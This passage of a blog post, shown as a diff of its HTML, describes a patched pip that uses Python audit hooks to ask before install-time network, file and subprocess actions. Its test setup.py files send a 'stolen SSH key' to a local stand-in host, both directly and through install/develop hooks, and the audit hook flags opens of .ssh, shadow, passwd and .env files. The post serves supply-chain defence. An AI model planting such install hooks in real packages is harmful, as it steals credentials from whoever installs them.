+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216</span><span>                subprocess_logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;[present-rich] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>, error)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217</span><span>                subprocess_logger<span style="color:#f92672">.</span>verbose(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218</span><span>                    <span style="color:#e6db74">&#34;[bold magenta]full command[/]: [blue]</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">[/]&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219</span><span>                    escape(format_command_args(cmd)),
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220</span><span>                    extra<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;markup&#34;</span>: <span style="color:#66d9ef">True</span>},
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221</span><span>                )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222</span><span>                subprocess_logger<span style="color:#f92672">.</span>verbose(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223</span><span>                    <span style="color:#e6db74">&#34;[bold magenta]cwd[/]: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224</span><span>                    escape(cwd <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;[inherit]&#34;</span>),
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225</span><span>                    extra<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;markup&#34;</span>: <span style="color:#66d9ef">True</span>},
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226</span><span>                )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228</span><span>            <span style="color:#66d9ef">raise</span> error
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229</span><span>        <span style="color:#66d9ef">elif</span> on_returncode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;warn&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">230</span><span>            subprocess_logger<span style="color:#f92672">.</span>warning(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">231</span><span>                <span style="color:#e6db74">&#39;Command &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34; had error code </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> in </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">232</span><span>                command_desc,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">233</span><span>                proc<span style="color:#f92672">.</span>returncode,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">234</span><span>                cwd,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">235</span><span>            )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">236</span><span>        <span style="color:#66d9ef">elif</span> on_returncode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ignore&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">237</span><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">238</span><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">239</span><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid value: on_returncode=</span><span style="color:#e6db74">{</span>on_returncode<span style="color:#e6db74">!r}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">240</span><span>    <span style="color:#66d9ef">return</span> output
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">241</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">242</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">243</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">runner_with_spinner_message</span>(message: str) <span style="color:#f92672">-&gt;</span> Callable[<span style="color:#f92672">...</span>, <span style="color:#66d9ef">None</span>]:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">244</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;Provide a subprocess_runner that shows a spinner message.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">245</span><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">246</span><span><span style="color:#e6db74">    Intended for use with for BuildBackendHookCaller. Thus, the runner has
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">247</span><span><span style="color:#e6db74">    an API that matches what&#39;s expected by BuildBackendHookCaller.subprocess_runner.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">248</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">249</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">250</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">runner</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">251</span><span>        cmd: List[str],
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">252</span><span>        cwd: Optional[str] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">253</span><span>        extra_environ: Optional[Mapping[str, Any]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">254</span><span>    ) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">255</span><span>        <span style="color:#66d9ef">with</span> open_spinner(message) <span style="color:#66d9ef">as</span> spinner:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">256</span><span>            call_subprocess(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">257</span><span>                cmd,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">258</span><span>                command_desc<span style="color:#f92672">=</span>message,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">259</span><span>                cwd<span style="color:#f92672">=</span>cwd,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">260</span><span>                extra_environ<span style="color:#f92672">=</span>extra_environ,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">261</span><span>                spinner<span style="color:#f92672">=</span>spinner,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">262</span><span>            )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">263</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">264</span><span>    <span style="color:#66d9ef">return</span> runner</span></span></code></pre></div>
+And that&rsquo;s it! It should prompt you everytime a socket connection is attempted during installation.</p>
+<h3 id="testing-our-hook">Testing our hook:<a hidden class="anchor" aria-hidden="true" href="#testing-our-hook">#</a></h3>
+<p>Let&rsquo;s create a fake package to test it out:</p>
+<pre tabindex="0"><code>$ mkdir test
+$ vim test/setup.py
+</code></pre><pre tabindex="0"><code># test/setup.py
+from setuptools import setup
+import requests # you can use socket too
+requests.get(&#39;http://0.0.0.0:8000/?key=your_stolen_ssh_key&#39;)
+setup()
+</code></pre><pre tabindex="0"><code>$ tar -czf test.tar.gz test
+$ pip install test.tar.gz
+Processing ./test.tar.gz
+  Preparing metadata (setup.py) ...
+Package is REQUESTING socket.getaddrinfo 0.0.0.0:8000. (y)es or (n)o
+</code></pre><p>Another method:</p>
+<pre tabindex="0"><code>$ vim test/setup.py
+</code></pre><pre tabindex="0"><code># test/setup.py
+from setuptools import setup
+from setuptools.command.install import install
+from setuptools.command.develop import develop
+import requests # you can use socket too
+
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        requests.get(&#39;http://0.0.0.0:8000/?key=your_stolen_ssh_key&#39;)
+
+
+class AfterDevelop(develop):
+    def run(self):
+        develop.run(self)
+        requests.get(&#39;http://0.0.0.0:8000/?key=your_stolen_ssh_key&#39;)
+
+
+setup(cmdclass={
+            &#39;install&#39;: AfterInstall,
+            &#39;develop&#39;: AfterDevelop})
+</code></pre><pre tabindex="0"><code>$ tar -czf test.tar.gz test
+$ pip install test.tar.gz
+Processing ./test.tar.gz
+  Preparing metadata (setup.py) ...
+done
+Building wheels for collected packages: UNKNOWN
+  Building wheel for UNKNOWN (setup.py)
+ ... Package is REQUESTING socket.getaddrinfo 0.0.0.0:8000. (y)es or (n)o
+</code></pre><h3 id="additional-checks">Additional checks:<a hidden class="anchor" aria-hidden="true" href="#additional-checks">#</a></h3>
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook</span>(event, args):
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#66d9ef">if</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;socket.getaddrinfo&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING &#34;</span> <span style="color:#f92672">+</span> event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#f92672">+</span>str(args[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;socket.connect&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING &#34;</span> <span style="color:#f92672">+</span> event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>])<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#f92672">+</span>str(args[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;open&#34;</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        arg <span style="color:#f92672">=</span> str(args[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;.ssh&#34;</span> <span style="color:#f92672">in</span> arg <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;shadow&#34;</span> <span style="color:#f92672">in</span> arg <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#f92672">in</span> arg <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;.config&#34;</span> <span style="color:#f92672">in</span> arg <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;.env&#39;</span> <span style="color:#f92672">in</span> arg:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>          sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING &#34;</span><span style="color:#f92672">+</span> event <span style="color:#f92672">+</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">+</span> arg <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>          sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>          <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;os.system&#34;</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING: &#34;</span> <span style="color:#f92672">+</span> event<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span> args[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;subprocess.call&#34;</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING: &#34;</span> <span style="color:#f92672">+</span> event<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;subprocess.run&#34;</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING: &#34;</span> <span style="color:#f92672">+</span> event<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span> str(args[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#66d9ef">elif</span> event <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;eval&#34;</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;REQUESTING: execution of arbitrary code&#34;</span> <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>linesep)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>    data <span style="color:#f92672">=</span> input()    
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;y&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)</span></span></code></pre></div>
+<strong>Note</strong>: It&rsquo;s easier to set a blacklist than a whitelist for <code>open</code> as pip opens various files when building and installing.
+And more&hellip;.</p>
+<h3 id="conclusion">Conclusion:<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h3>
+<p>Audit hooks are NOT foolproof and can be bypassed by an advanced adversary. See the <a href="https://peps.python.org/pep-0578/">PEP</a> for more info.
+Despite that, this implementation provides a simple and effective defence against the abuse of install time hooks.</p>
+<p>See the <a href="https://github.com/R9295/pip/commit/79a3548f981b5f8260fb7cf4c89f0f60fdc694fd">full implementation</a></p>
+<h3 id="use-it">Use it:<a hidden class="anchor" aria-hidden="true" href="#use-it">#</a></h3>
+<pre tabindex="0"><code>$ python3 -m venv venv
+$ cd venv/lib/python3.&lt;yourversion&gt;/site-packages/
+$ mv pip old_pip
+$ wget https://github.com/R9295/pip/archive/refs/heads/main.zip
+$ unzip main.zip
+$ mv pip-main pip
+$ mv src/pip/* .
+$ pip install test.tar.gz
+# yay!
+</code></pre><div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Ohm et al. Backstabber&rsquo;s Knife Collection: A Review of Open Source Software Supply Chain Attacks&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>Duan et al. Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://stackoverflow.com/questions/24263774/post-install-script-after-installing-a-wheel">https://stackoverflow.com/questions/24263774/post-install-script-after-installing-a-wheel</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://R9295.github.io/tags/supply-chain/">supply chain</a></li>
+      <li><a href="https://R9295.github.io/tags/python/">python</a></li>
+      <li><a href="https://R9295.github.io/tags/pip/">pip</a></li>
+      <li><a href="https://R9295.github.io/tags/supply-chain-attack/">supply chain attack</a></li>
+      <li><a href="https://R9295.github.io/tags/mitigate/">mitigate</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>
+        Feedback? Issues? blog [dot] contact [at] ruebezahl[dot]mozmail[dot]com
+    </span>
+    <span>
+        <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">All writing is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
